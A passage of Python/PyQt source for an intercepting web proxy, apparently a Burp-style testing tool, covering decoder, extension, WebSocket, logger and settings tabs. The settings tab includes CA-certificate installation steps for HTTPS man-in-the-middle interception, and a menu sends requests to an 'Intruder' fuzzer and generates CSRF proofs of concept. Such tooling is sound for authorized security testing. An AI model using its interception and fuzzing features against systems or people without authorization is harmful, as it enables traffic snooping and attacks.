        enc_btn = self._btn("Encode ▶", "primary", h=30)
        dec_btn = self._btn("◀ Decode", "success", h=30)
        bar.addWidget(dec_btn)
        bar.addWidget(enc_btn)
        bar.addStretch()
        v.addLayout(bar)
        self.dec_out = QPlainTextEdit()
        self.dec_out.setReadOnly(True)
        self.dec_out.setFont(mono_font(11))
        v.addWidget(self.dec_out)
        enc_btn.clicked.connect(lambda: self._run_decode(encode=True))
        dec_btn.clicked.connect(lambda: self._run_decode(encode=False))
        return w

    def _run_decode(self, encode: bool):
        text = self.dec_in.toPlainText()
        t = self.dec_type.currentText()
        try:
            if t == "Base64":
                out = base64.b64encode(text.encode()).decode() if encode else base64.b64decode(text).decode('utf-8', 'replace')
            elif t == "Base64 URL-safe":
                out = base64.urlsafe_b64encode(text.encode()).decode() if encode else base64.urlsafe_b64decode(text + '==' * 3).decode('utf-8', 'replace')
            elif t == "URL Encode":
                out = url_quote(text, safe='') if encode else url_unquote(text)
            elif t == "Hex":
                out = text.encode().hex() if encode else bytes.fromhex(text).decode('utf-8', 'replace')
            elif t == "HTML Entity":
                import html
                out = html.escape(text) if encode else html.unescape(text)
            elif t == "JWT Decode":
                d = JWTAnalyzer.decode(text)
                out = json.dumps(d, indent=2)
            elif t == "MD5 Hash":
                out = hashlib.md5(text.encode()).hexdigest()
            elif t == "SHA-256 Hash":
                out = hashlib.sha256(text.encode()).hexdigest()
            elif t == "ROT13":
                import codecs
                out = codecs.encode(text, 'rot_13')
            else:
                out = text
            self.dec_out.setPlainText(out)
        except Exception as e:
            self.dec_out.setPlainText(f"Error: {e}")

    # ---------- Extensions Tab ----------
    def _extensions_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)

        # Header info
        info = QLabel(
            "🧩  Load custom Python extensions to intercept and modify traffic, add new tools, or automate tasks.\n"
            "Each extension can hook on_request(msg) and on_response(msg) and return modified dictionaries."
        )
        info.setWordWrap(True)
        info.setStyleSheet(f"color:{T.TXT2};background:{T.SURFACE};padding:10px;border-radius:8px;"
                           f"border:1px solid {T.BORDER};font-size:12px")
        v.addWidget(info)

        sp = QSplitter(Qt.Orientation.Horizontal)
        v.addWidget(sp, 1)

        # ---- Left: extension list ----
        left = QWidget()
        lv = QVBoxLayout(left)
        lv.setContentsMargins(0, 0, 4, 0)
        lv.addWidget(QLabel("Loaded Extensions"))
        self._ext_tbl = QTableWidget(0, 4)
        self._ext_tbl.setHorizontalHeaderLabels(["Enabled", "Name", "Version", "Author"])
        self._ext_tbl.horizontalHeader().setStretchLastSection(True)
        self._ext_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self._ext_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self._ext_tbl.itemClicked.connect(self._ext_tbl_click)
        lv.addWidget(self._ext_tbl, 1)

        btn_row = QHBoxLayout()
        load_btn  = self._btn("📂 Load .py", "primary", h=30)
        unload_btn = self._btn("🗑 Unload",  "danger",  h=30)
        tmpl_btn  = self._btn("📄 New Template", h=30)
        load_btn.clicked.connect(self._ext_load)
        unload_btn.clicked.connect(self._ext_unload)
        tmpl_btn.clicked.connect(self._ext_new_template)
        btn_row.addWidget(load_btn)
        btn_row.addWidget(unload_btn)
        btn_row.addWidget(tmpl_btn)
        btn_row.addStretch()
        lv.addLayout(btn_row)
        sp.addWidget(left)

        # ---- Right: details + log ----
        right = QWidget()
        rv = QVBoxLayout(right)
        rv.setContentsMargins(4, 0, 0, 0)

        self._ext_detail = QPlainTextEdit()
        self._ext_detail.setReadOnly(True)
        self._ext_detail.setFont(mono_font(10))
        self._ext_detail.setMaximumHeight(120)
        self._ext_detail.setPlaceholderText("Select an extension to see details…")
        rv.addWidget(QLabel("Extension Details"))
        rv.addWidget(self._ext_detail)

        rv.addWidget(QLabel("Extension Log"))
        self._ext_log = QPlainTextEdit()
        self._ext_log.setReadOnly(True)
        self._ext_log.setFont(mono_font(10))
        self._ext_log.setPlaceholderText("Extension output will appear here…")
        rv.addWidget(self._ext_log, 1)

        clr = self._btn("🗑 Clear Log", h=26)
        clr.clicked.connect(self._ext_log.clear)
        rv.addWidget(clr)
        sp.addWidget(right)
        sp.setSizes([500, 800])

        # Wire extension system log to UI
        self.ext_sys.log_signal.connect(
            lambda msg: self._ext_log.appendPlainText(
                f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {msg}"))

        # Built-in extensions section
        bi_grp = QGroupBox("Built-in Extensions (click to load)")
        bi_lay = QHBoxLayout(bi_grp)
        BUILTINS = [
            ("🔍 Header Inspector",   self._ext_builtin_header_inspector),
            ("⏱ Timing Analyzer",    self._ext_builtin_timing),
            ("🍪 Cookie Extractor",   self._ext_builtin_cookie),
            ("🔒 Security Grader",    self._ext_builtin_security),
            ("📊 Traffic Stats",      self._ext_builtin_stats),
        ]
        for label, fn in BUILTINS:
            b = self._btn(label, h=28)
            b.clicked.connect(fn)
            bi_lay.addWidget(b)
        bi_lay.addStretch()
        v.addWidget(bi_grp)
        return w

    def _ext_load(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load Extension", "", "Python (*.py)")
        if not path:
            return
        ok, msg = self.ext_sys.load_file(path)
        if ok:
            self._ext_refresh_table()
        else:
            QMessageBox.critical(self, "Extension Error", msg)

    def _ext_unload(self):
        rows = self._ext_tbl.selectedItems()
        if not rows:
            return
        name = self._ext_tbl.item(rows[0].row(), 1).text()
        self.ext_sys.unload(name)
        self._ext_refresh_table()
        self._log(f"Extension unloaded: {name}")

    def _ext_new_template(self):
        path, _ = QFileDialog.getSaveFileName(self, "Save Extension Template", "my_extension.py", "Python (*.py)")
        if not path:
            return
        with open(path, "w") as f:
            f.write(self.ext_sys.SAMPLE_EXTENSION)
        self._ext_log.appendPlainText(f"Template saved: {path}\nEdit it then click 'Load .py'")

    def _ext_refresh_table(self):
        self._ext_tbl.setRowCount(0)
        for name, ext in self.ext_sys.extensions.items():
            r = self._ext_tbl.rowCount()
            self._ext_tbl.insertRow(r)
            chk = QTableWidgetItem("✓" if ext["enabled"] else "✗")
            chk.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            chk.setForeground(QBrush(QColor(T.GREEN if ext["enabled"] else T.RED)))
            self._ext_tbl.setItem(r, 0, chk)
            self._ext_tbl.setItem(r, 1, QTableWidgetItem(name))
            self._ext_tbl.setItem(r, 2, QTableWidgetItem(ext.get("version", "?")))
            self._ext_tbl.setItem(r, 3, QTableWidgetItem(ext.get("author",  "?")))

    def _ext_tbl_click(self, item):
        row = item.row()
        name = self._ext_tbl.item(row, 1).text() if self._ext_tbl.item(row, 1) else ""
        ext  = self.ext_sys.extensions.get(name, {})
        if not ext:
            return
        has_req  = "✓" if ext.get("on_request")  else "✗"
        has_resp = "✓" if ext.get("on_response") else "✗"
        detail = (
            f"Name:       {name}\n"
            f"Version:    {ext.get('version','?')}\n"
            f"Author:     {ext.get('author','?')}\n"
            f"Path:       {ext.get('path','?')}\n"
            f"Description:{ext.get('desc','')}\n"
            f"on_request: {has_req}  |  on_response: {has_resp}\n"
            f"Enabled:    {'Yes' if ext.get('enabled') else 'No'}"
        )
        self._ext_detail.setPlainText(detail)
        # Toggle enable on row click
        if item.column() == 0:
            enabled = not ext.get("enabled", True)
            self.ext_sys.toggle(name, enabled)
            self._ext_refresh_table()

    def _ext_load_inline(self, code: str, name: str, desc: str):
        """Load a built-in extension from an inline code string."""
        import tempfile
        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, prefix=f"ixext_{name}_") as f:
            f.write(code)
            path = f.name
        ok, msg = self.ext_sys.load_file(path)
        if ok:
            self.ext_sys.extensions[name]["desc"] = desc
            self._ext_refresh_table()
            self._log(f"Built-in loaded: {name}")
        else:
            QMessageBox.critical(self, "Built-in Error", msg)

    def _ext_builtin_header_inspector(self):
        code = (
            "EXTENSION_NAME='Header Inspector'\n"
            "EXTENSION_DESC='Logs all request/response headers to the extension log'\n"
            "EXTENSION_VERSION='1.0'\nEXTENSION_AUTHOR='Built-in'\n\n"
            "def on_request(msg):\n"
            "    import datetime\n"
            "    ts=datetime.datetime.now().strftime('%H:%M:%S')\n"
            "    print(f'[{ts}] REQ {msg.get(\"method\",\"?\")} {msg.get(\"url\",\"?\")[:80]}')\n"
            "    for k,v in (msg.get('req_headers',{}) or {}).items():\n"
            "        print(f'   {k}: {v}')\n"
            "    return msg\n"
            "def on_response(msg):\n"
            "    import datetime\n"
            "    ts=datetime.datetime.now().strftime('%H:%M:%S')\n"
            "    print(f'[{ts}] RESP {msg.get(\"status\",0)} {msg.get(\"url\",\"?\")[:80]}')\n"
            "    return msg\n"
        )
        self._ext_load_inline(code, "Header Inspector", "Logs all request/response headers")

    def _ext_builtin_timing(self):
        code = (
            "EXTENSION_NAME='Timing Analyzer'\n"
            "EXTENSION_DESC='Flags slow responses (>2s) in the log'\n"
            "EXTENSION_VERSION='1.0'\nEXTENSION_AUTHOR='Built-in'\n\n"
            "def on_response(msg):\n"
            "    dur=msg.get('dur',0)\n"
            "    if dur>2.0:\n"
            "        print(f'[SLOW] {dur:.2f}s — {msg.get(\"url\",\"?\")[:80]}')\n"
            "    return msg\n"
        )
        self._ext_load_inline(code, "Timing Analyzer", "Flags slow responses >2s")

    def _ext_builtin_cookie(self):
        code = (
            "EXTENSION_NAME='Cookie Extractor'\n"
            "EXTENSION_DESC='Prints all Set-Cookie headers from responses'\n"
            "EXTENSION_VERSION='1.0'\nEXTENSION_AUTHOR='Built-in'\n\n"
            "def on_response(msg):\n"
            "    rh=msg.get('resp_headers',{})\n"
            "    if isinstance(rh,str):\n"
            "        import json; rh=json.loads(rh) if rh else {}\n"
            "    cookie=rh.get('Set-Cookie',rh.get('set-cookie',''))\n"
            "    if cookie:\n"
            "        print(f'[COOKIE] {msg.get(\"host\",\"?\")} → {cookie[:200]}')\n"
            "    return msg\n"
        )
        self._ext_load_inline(code, "Cookie Extractor", "Prints Set-Cookie headers")

    def _ext_builtin_security(self):
        code = (
            "EXTENSION_NAME='Security Grader'\n"
            "EXTENSION_DESC='Grades responses by missing security headers'\n"
            "EXTENSION_VERSION='1.0'\nEXTENSION_AUTHOR='Built-in'\n\n"
            "REQUIRED=['strict-transport-security','content-security-policy',\n"
            "          'x-frame-options','x-content-type-options']\n"
            "def on_response(msg):\n"
            "    rh=msg.get('resp_headers',{})\n"
            "    if isinstance(rh,str):\n"
            "        import json; rh=json.loads(rh) if rh else {}\n"
            "    hl={k.lower():v for k,v in rh.items()}\n"
            "    missing=[h for h in REQUIRED if h not in hl]\n"
            "    if missing:\n"
            "        grade='F' if len(missing)>=4 else 'D' if len(missing)==3 else 'C' if len(missing)==2 else 'B'\n"
            "        print(f'[GRADE {grade}] {msg.get(\"host\",\"?\")} missing: {\", \".join(missing)}')\n"
            "    return msg\n"
        )
        self._ext_load_inline(code, "Security Grader", "Grades responses by security headers")

    def _ext_builtin_stats(self):
        code = (
            "EXTENSION_NAME='Traffic Stats'\n"
            "EXTENSION_DESC='Prints running totals every 50 requests'\n"
            "EXTENSION_VERSION='1.0'\nEXTENSION_AUTHOR='Built-in'\n\n"
            "_count=[0]\n"
            "_methods={}\n"
            "def on_request(msg):\n"
            "    _count[0]+=1\n"
            "    m=msg.get('method','?')\n"
            "    _methods[m]=_methods.get(m,0)+1\n"
            "    if _count[0]%50==0:\n"
            "        print(f'[STATS] {_count[0]} reqs | methods: {_methods}')\n"
            "    return msg\n"
        )
        self._ext_load_inline(code, "Traffic Stats", "Running traffic totals every 50 requests")

    # ---------- WebSocket Tab ----------
    def _websocket_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)

        info = QLabel(
            "🔌  WebSocket sessions are detected from HTTP Upgrade handshakes captured by the proxy.\n"
            "The proxy captures the upgrade handshake; actual WS frames require OS-level hooks or browser extensions."
        )
        info.setWordWrap(True)
        info.setStyleSheet(f"color:{T.TXT2};background:{T.SURFACE};padding:10px;border-radius:8px;"
                           f"border:1px solid {T.BORDER};font-size:12px")
        v.addWidget(info)

        sp = QSplitter(Qt.Orientation.Vertical)
        v.addWidget(sp, 1)

        # Sessions table
        self._ws_tbl = QTableWidget(0, 5)
        self._ws_tbl.setHorizontalHeaderLabels(["#", "Host", "WebSocket URL", "Status", "Time"])
        self._ws_tbl.horizontalHeader().setStretchLastSection(True)
        self._ws_tbl.setAlternatingRowColors(True)
        self._ws_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self._ws_tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self._ws_tbl.customContextMenuRequested.connect(self._ws_ctx)
        self._ws_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        sp.addWidget(self._ws_tbl)

        # Handshake details
        detail_w = QWidget()
        dv = QVBoxLayout(detail_w)
        dv.setContentsMargins(0, 0, 0, 0)
        dv.addWidget(QLabel("Upgrade Handshake Request / Response"))
        self._ws_detail = QPlainTextEdit()
        self._ws_detail.setReadOnly(True)
        self._ws_detail.setFont(mono_font(10))
        self._ws_detail.setPlaceholderText("Click a session to view the upgrade handshake…")
        HTTPHighlighter(self._ws_detail.document())
        dv.addWidget(self._ws_detail)
        sp.addWidget(detail_w)
        sp.setSizes([350, 250])

        # Controls
        ctrl = QHBoxLayout()
        clr_btn = self._btn("🗑 Clear", h=28)
        clr_btn.clicked.connect(lambda: (self._ws_tbl.setRowCount(0),
                                         self.ws_tracker.sessions.clear()))
        replay_btn = self._btn("🔁 Send Upgrade to Repeater", "primary", h=28)
        replay_btn.clicked.connect(self._ws_send_to_repeater)
        ctrl.addWidget(clr_btn)
        ctrl.addWidget(replay_btn)
        ctrl.addStretch()
        v.addLayout(ctrl)

        # Connect tracker
        self.ws_tracker.upgrade_seen.connect(self._ws_on_session)
        self._ws_tbl.itemClicked.connect(self._ws_item_click)
        return w

    def _ws_on_session(self, session: dict):
        r = self._ws_tbl.rowCount()
        self._ws_tbl.insertRow(r)
        ts = datetime.datetime.fromtimestamp(session["ts"]).strftime("%H:%M:%S")
        for c, val in enumerate([str(r + 1), session["host"], session["url"],
                                  str(session["status"]), ts]):
            self._ws_tbl.setItem(r, c, QTableWidgetItem(val))
        self._ws_tbl.item(r, 0).setData(Qt.ItemDataRole.UserRole, session["id"])
        self._log(f"WebSocket upgrade: {session['url']}")

    def _ws_item_click(self, item):
        mid = self._ws_tbl.item(item.row(), 0).data(Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if not msg:
            return
        rh = safe_json(msg.get("req_headers", "{}"))
        text = f"{msg['method']} {msg['path']} HTTP/1.1\n"
        for k, v in rh.items():
            text += f"{k}: {v}\n"
        text += "\n--- Server Response ---\n"
        sh = safe_json(msg.get("resp_headers", "{}"))
        text += f"HTTP/1.1 {msg.get('status', 101)} Switching Protocols\n"
        for k, v in sh.items():
            text += f"{k}: {v}\n"
        self._ws_detail.setPlainText(text)

    def _ws_ctx(self, pos):
        item = self._ws_tbl.itemAt(pos)
        if not item:
            return
        mid = self._ws_tbl.item(item.row(), 0).data(Qt.ItemDataRole.UserRole)
        menu = QMenu()
        a_rep = menu.addAction("Send Upgrade to Repeater")
        a_url  = menu.addAction("Copy WebSocket URL")
        a_curl = menu.addAction("Copy Upgrade as cURL")
        action = menu.exec(self._ws_tbl.viewport().mapToGlobal(pos))
        msg = self.db.get_msg(mid) if mid else None
        if not msg:
            return
        if action == a_rep:
            self._send_to_rep(msg)
        elif action == a_url:
            url = msg["url"].replace("http://", "ws://").replace("https://", "wss://")
            QApplication.clipboard().setText(url)
        elif action == a_curl:
            QApplication.clipboard().setText(self._to_curl(msg))

    def _ws_send_to_repeater(self):
        row = self._ws_tbl.currentRow()
        if row < 0:
            return
        mid = self._ws_tbl.item(row, 0).data(Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if msg:
            self._send_to_rep(msg)

    # ---------- Logger Tab ----------
    def _logger_tab(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(8, 8, 8, 8)

        # Filter bar
        fb = QHBoxLayout()
        fb.addWidget(QLabel("Filter:"))
        self._log_filter = QLineEdit()
        self._log_filter.setPlaceholderText("Regex or plain text…")
        self._log_filter.setFixedHeight(30)
        self._log_filter_regex = QCheckBox("Regex")
        self._log_m_filter = QComboBox()
        self._log_m_filter.addItems(["All", "GET", "POST", "PUT", "DELETE", "PATCH"])
        self._log_s_filter = QComboBox()
        self._log_s_filter.addItems(["All", "2xx", "3xx", "4xx", "5xx"])
        self._log_neg = QCheckBox("Negate")
        apply_btn = self._btn("Apply", "primary", h=30)
        clr_btn2  = self._btn("Clear", h=30)
        fb.addWidget(self._log_filter)
        fb.addWidget(self._log_filter_regex)
        fb.addWidget(self._log_neg)
        fb.addWidget(QLabel("Method:"))
        fb.addWidget(self._log_m_filter)
        fb.addWidget(QLabel("Status:"))
        fb.addWidget(self._log_s_filter)
        fb.addWidget(apply_btn)
        fb.addWidget(clr_btn2)
        v.addLayout(fb)

        # Logger table
        self._logger_tbl = QTableWidget(0, 8)
        self._logger_tbl.setHorizontalHeaderLabels([
            "#", "Time", "Method", "Host", "Path", "Status", "Size", "Duration"])
        self._logger_tbl.horizontalHeader().setStretchLastSection(True)
        self._logger_tbl.setAlternatingRowColors(True)
        self._logger_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self._logger_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self._logger_tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self._logger_tbl.customContextMenuRequested.connect(self._logger_ctx)
        for i, w2 in enumerate([45, 80, 70, 170, 320, 65, 80, 70]):
            self._logger_tbl.setColumnWidth(i, w2)
        v.addWidget(self._logger_tbl, 1)

        # Detail pane
        sp = QSplitter(Qt.Orientation.Horizontal)
        for attr, lbl in [("_log_req_view", "📤 Request"), ("_log_resp_view", "📥 Response")]:
            c = QWidget()
            cv = QVBoxLayout(c)
            cv.setContentsMargins(0, 4, 0, 0)
            cv.addWidget(QLabel(lbl, styleSheet=f"color:{T.TXT2};font-size:11px;font-weight:600"))
            pe = QPlainTextEdit()
            pe.setReadOnly(True)
            pe.setFont(mono_font(10))
            pe.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
            HTTPHighlighter(pe.document())
            setattr(self, attr, pe)
            cv.addWidget(pe)
            sp.addWidget(c)
        v.addWidget(sp)
        sp.setSizes([700, 700])

        self._logger_tbl.itemClicked.connect(self._logger_item_click)
        apply_btn.clicked.connect(self._logger_apply_filter)
        self._log_filter.returnPressed.connect(self._logger_apply_filter)
        clr_btn2.clicked.connect(self._logger_tbl.clearContents)

        # Backfill: this tab is lazy-loaded, so every request captured
        # before the user's first click was silently skipped by the
        # hasattr guard in _logger_add_row. self.db.recent is newest-first
        # (appendleft), so walk it in reverse to rebuild correct
        # chronological order (oldest at top, like a running log).
        for m in reversed(list(self.db.recent)):
            self._logger_add_row(m)

        return w

    def _logger_add_row(self, msg: dict):
        """Add a row to the Logger table (called from _on_msg).
        Logger is a lazy-loaded tab — until the user opens it once,
        _logger_tbl doesn't exist yet, so skip silently rather than
        crash on every single captured request."""
        if not hasattr(self, '_logger_tbl'):
            return
        r = self._logger_tbl.rowCount()
        self._logger_tbl.insertRow(r)
        ts = datetime.datetime.fromtimestamp(msg.get("ts", time.time())).strftime("%H:%M:%S.%f")[:-3]
        vals = [str(r + 1), ts, msg.get("method", ""), msg.get("host", ""),
                msg.get("path", ""), str(msg.get("status", 0)),
                pretty_size(msg.get("resp_size", 0)), f"{msg.get('dur', 0):.3f}s"]
        for c, val in enumerate(vals):
            self._logger_tbl.setItem(r, c, QTableWidgetItem(val))
        self._logger_tbl.item(r, 0).setData(Qt.ItemDataRole.UserRole, msg["id"])
        # Colour method column
        mc = msg.get("method", "")
        self._logger_tbl.item(r, 2).setForeground(QBrush(QColor(method_color(mc))))
        # Colour status column
        sc = msg.get("status", 0)
        self._logger_tbl.item(r, 5).setForeground(QBrush(QColor(status_color(sc))))
        if self._autoscroll:
            self._logger_tbl.scrollToBottom()

    def _logger_item_click(self, item):
        mid = self._logger_tbl.item(item.row(), 0).data(Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if not msg:
            return
        rh = safe_json(msg.get("req_headers", "{}"))
        req = f"{msg['method']} {msg['path']} HTTP/1.1\n"
        for k, v in rh.items():
            req += f"{k}: {v}\n"
        rb = msg.get("req_body")
        if rb:
            req += "\n" + decode_body(rb)
        self._log_req_view.setPlainText(req)
        sh = safe_json(msg.get("resp_headers", "{}"))
        resp = f"HTTP/1.1 {msg.get('status', 0)}\n"
        for k, v in sh.items():
            resp += f"{k}: {v}\n"
        rsb = msg.get("resp_body")
        if rsb:
            resp += "\n" + decode_body(rsb)[:60000]
        self._log_resp_view.setPlainText(resp)

    def _logger_apply_filter(self):
        pattern = self._log_filter.text().strip()
        method_f = self._log_m_filter.currentText()
        status_f = self._log_s_filter.currentText()
        negate   = self._log_neg.isChecked()
        use_regex = self._log_filter_regex.isChecked()
        for row in range(self._logger_tbl.rowCount()):
            method = (self._logger_tbl.item(row, 2) or QTableWidgetItem()).text()
            host   = (self._logger_tbl.item(row, 3) or QTableWidgetItem()).text()
            path   = (self._logger_tbl.item(row, 4) or QTableWidgetItem()).text()
            status = (self._logger_tbl.item(row, 5) or QTableWidgetItem()).text()
            show = True
            if method_f != "All" and method != method_f:
                show = False
            if show and status_f != "All":
                try:
                    lo = int(status_f[0]) * 100
                    show = lo <= int(status) < lo + 100
                except Exception:
                    pass
            if show and pattern:
                haystack = host + path
                try:
                    matched = bool(re.search(pattern, haystack, re.IGNORECASE)) if use_regex \
                              else pattern.lower() in haystack.lower()
                except Exception:
                    matched = False
                if negate:
                    matched = not matched
                show = matched
            self._logger_tbl.setRowHidden(row, not show)

    def _logger_ctx(self, pos):
        item = self._logger_tbl.itemAt(pos)
        if not item:
            return
        mid = self._logger_tbl.item(item.row(), 0).data(Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if not msg:
            return
        menu = QMenu()
        a_rep  = menu.addAction("Send to Repeater")
        a_int  = menu.addAction("Send to Intruder")
        a_curl = menu.addAction("Copy as cURL")
        a_url  = menu.addAction("Copy URL")
        action = menu.exec(self._logger_tbl.viewport().mapToGlobal(pos))
        if action == a_rep:
            self._send_to_rep(msg)
        elif action == a_int:
            self._send_to_int(msg)
        elif action == a_curl:
            QApplication.clipboard().setText(self._to_curl(msg))
        elif action == a_url:
            QApplication.clipboard().setText(msg.get("url", ""))

    # ---------- Settings ----------
    def _settings_tab(self):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        c = QWidget()
        cv = QVBoxLayout(c)

        ca_g = QGroupBox("CA Certificate — HTTPS MITM")
        ca_l = QVBoxLayout(ca_g)
        ca_info = QLabel(
            "① Click  🔐 Generate CA Certificate  below\n"
            "② Cert is saved to:  ~/kingception/kingception-ca.crt\n"
            "\n"
            "FIREFOX:\n"
            "  Settings → Privacy & Security → Certificates → View Certificates\n"
            "  Authorities tab → Import → select ~/kingception/kingception-ca.crt\n"
            "  ☑ Trust this CA to identify websites → OK\n"
            "\n"
            "CHROME / CHROMIUM:\n"
            "  Settings → Privacy → Security → Manage certificates\n"
            "  Authorities tab → Import → select ~/kingception/kingception-ca.crt\n"
            "  ☑ Trust for identifying websites → OK\n"
            "\n"
            "KALI SYSTEM-WIDE (optional):\n"
            "  sudo cp ~/kingception/kingception-ca.crt /usr/local/share/ca-certificates/kingception-ca.crt\n"
            "  sudo update-ca-certificates\n"
            "\n"
            "⑤ Configure browser proxy → HTTP 127.0.0.1:8080\n"
            "⑥ HTTPS traffic now fully intercepted — body included ✅")
        ca_info.setStyleSheet(f"color:{T.TXT2};padding:12px;border-radius:8px;background:{T.SURFACE};"
                              f"font-family:{T.MONO};font-size:11px")
        ca_info.setWordWrap(True)
        ca_l.addWidget(ca_info)
        self.ca_lbl = QLabel()
        ca_p = Path.home() / 'kingception' / 'kingception-ca.crt'
        if ca_p.exists():
            self.ca_lbl.setText(f"✅ {ca_p}")
            self.ca_lbl.setStyleSheet(f"color:{T.GREEN}")
        else:
            self.ca_lbl.setText("⚠ No CA yet")
            self.ca_lbl.setStyleSheet(f"color:{T.YELLOW}")
        ca_l.addWidget(self.ca_lbl)
        gen_btn = self._btn("🔐 Generate CA Certificate", "primary", h=36)
        gen_btn.clicked.connect(self._gen_ca)
        ca_l.addWidget(gen_btn)

        ca_btns = QHBoxLayout()
        open_btn = self._btn("📂 Open ~/kingception Folder", None, h=32)
        copy_btn = self._btn("📋 Copy Cert Path", None, h=32)
        open_btn.clicked.connect(lambda: __import__('subprocess').Popen(
            ['xdg-open', str(Path.home() / 'kingception')]))
        copy_btn.clicked.connect(lambda: QApplication.clipboard().setText(
            str(Path.home() / 'kingception' / 'kingception-ca.crt')))
        ca_btns.addWidget(open_btn)
        ca_btns.addWidget(copy_btn)
        ca_btns.addStretch()
        ca_l.addLayout(ca_btns)
        cv.addWidget(ca_g)

        mr_g = QGroupBox("Match & Replace Rules")
        mr_l = QVBoxLayout(mr_g)
        self.rules_tbl = QTableWidget(0, 6)
        self.rules_tbl.setHorizontalHeaderLabels(["Name", "Pattern", "Replace", "Apply To", "Scope", "Regex"])
        self.rules_tbl.horizontalHeader().setStretchLastSection(True)
        self.rules_tbl.setFixedHeight(160)
        mr_l.addWidget(self.rules_tbl)
        rb = QHBoxLayout()
        add_r = self._btn("➕ Add Rule", h=28)
        add_r.clicked.connect(self._add_rule)
        del_r = self._btn("🗑 Delete", "danger", h=28)
        del_r.clicked.connect(self._del_rule)
        rb.addWidget(add_r)
        rb.addWidget(del_r)
        rb.addStretch()
        mr_l.addLayout(rb)
        cv.addWidget(mr_g)

        sc_g = QGroupBox("Scope (prefix ! to exclude)")
        sc_l = QVBoxLayout(sc_g)
        self.scope_edit = QPlainTextEdit()
        self.scope_edit.setFont(mono_font(10))
        self.scope_edit.setPlaceholderText("example.com\ntarget.com/api\n!cdn.example.com")
        self.scope_edit.setMaximumHeight(90)
        sc_l.addWidget(self.scope_edit)
        sv = self._btn("💾 Save Scope", h=28)
        sv.clicked.connect(self._save_scope)
        sc_l.addWidget(sv)
        cv.addWidget(sc_g)

        exp_g = QGroupBox("Export / Import")
        exp_l = QHBoxLayout(exp_g)
        for label, fn in [("HAR", self._export_har), ("JSON", self._export_json),
                          ("CSV", self._export_csv), ("cURL", self._export_curl),
                          ("Import JSON", self._import_json)]:
            b = self._btn(label, h=30)
            b.clicked.connect(fn)
            exp_l.addWidget(b)
        exp_l.addStretch()
        cv.addWidget(exp_g)

        log_g = QGroupBox("Console Log")
        ll = QVBoxLayout(log_g)
        self.log_box = QPlainTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setFont(mono_font(10))
        self.log_box.setMaximumBlockCount(3000)
        ll.addWidget(self.log_box)
        cv.addWidget(log_g)

        cv.addStretch()
        scroll.setWidget(c)
        return scroll

    # ---------- Intercept Context Menu (Rich Actions) ----------
    def _ic_editor_ctx(self, pos):
        if not self._cur_req_pi:
            return
        menu = QMenu()

        # --- Send to ---
        send_menu = menu.addMenu("📤 Send To")
        a_rep  = send_menu.addAction("🔁 Repeater")
        a_int  = send_menu.addAction("💣 Intruder")
        a_comp = send_menu.addAction("⚖ Comparer A")
        a_jwt  = send_menu.addAction("🔑 JWT Analyzer")
        menu.addSeparator()

        # --- Request editing ---
        a_method   = menu.addAction("🔄 Change Request Method")
        a_headers  = menu.addAction("✏ Edit Headers (table)")
        a_beautify = menu.addAction("✨ Beautify Body (JSON/XML)")
        menu.addSeparator()

        # --- Copy ---
        copy_menu  = menu.addMenu("📋 Copy")
        a_copy_url = copy_menu.addAction("Copy URL")
        a_curl     = copy_menu.addAction("Copy as cURL")
        a_copy_req = copy_menu.addAction("Copy Request Raw")
        a_python   = copy_menu.addAction("Copy as Python requests")
        menu.addSeparator()

        # --- Scope / note ---
        a_scope = menu.addAction("✅ Add Host to Scope")
        a_note  = menu.addAction("📝 Note for this request")
        menu.addSeparator()

        # --- PoC / tools ---
        a_csrf = menu.addAction("🛡 Generate CSRF PoC")
        a_open = menu.addAction("🌐 Open URL in Browser")
        a_save = menu.addAction("💾 Save Request to File")

        action = menu.exec(self.ic_editor.viewport().mapToGlobal(pos))
        if not action:
            return
        raw = self.ic_editor.toPlainText()
        pr  = self._cur_req_pi
        headers, body = self._parse_raw_request(raw)

        if action == a_rep:
            self._add_rep_tab(title=pr.url[:28], method=pr.method, url=pr.url,
                              raw_request=raw)
            self.tabs.setCurrentIndex(2)
        elif action == a_int:
            self.intr_url.setText(pr.url)
            self.intr_method.setCurrentText(pr.method)
            self.intr_headers.setPlainText("\n".join(f"{k}: {v}" for k, v in headers.items()))
            self.intr_body.setPlainText(decode_body(body) or '{"key":"§PAYLOAD§"}')
            self.tabs.setCurrentIndex(3)
            self._log("Sent to Intruder — add §PAYLOAD§ then Start Attack")
        elif action == a_comp:
            pass  # comp_a/comp_b removed with Comparer tab
            # self.tabs.setCurrentIndex(5)  # Decoder
        elif action == a_jwt:
            auth = headers.get("Authorization", headers.get("authorization", ""))
            token = auth.split("Bearer", 1)[1].strip() if "Bearer" in auth else ""
            if not token:
                m2 = re.search(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*", decode_body(body))
                if m2:
                    token = m2.group(0)
            if token:
                self.jwt_input.setPlainText(token)
                self.tabs.setCurrentIndex(6)  # Settings
        elif action == a_method:
            methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
